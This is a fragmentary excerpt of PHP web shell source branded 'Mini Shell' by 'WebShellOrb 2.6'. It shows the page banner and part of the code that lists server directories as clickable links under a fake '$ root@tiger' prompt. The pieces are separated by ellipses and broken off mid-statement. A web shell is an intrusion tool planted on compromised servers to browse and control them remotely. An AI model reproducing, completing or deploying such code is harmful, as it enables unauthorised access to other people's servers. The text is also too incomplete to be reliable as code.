...
<html>
<head>
<title>Mini Shell &nbsp&nbsp&nbsp&nbsp|&nbsp&nbsp&nbsp&nbsp WebShellOrb 2.6</title>
</head>';
...
echo '</head>
<body><b>
<H1><center><font color="red">Mini Shell</font><font color="#00ff00">&nbsp&nbsp&nbspBy&nbsp&nbsp&nbsp</font><font color="dodgerblue">WebShellOrb 2.6</font></center></h1>
...
if($pat == '' && $id == 0){
$a = true;
echo '<font color=#fff><center>$ root@tiger : <a href="?path=/" style="text-decoration:none;">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
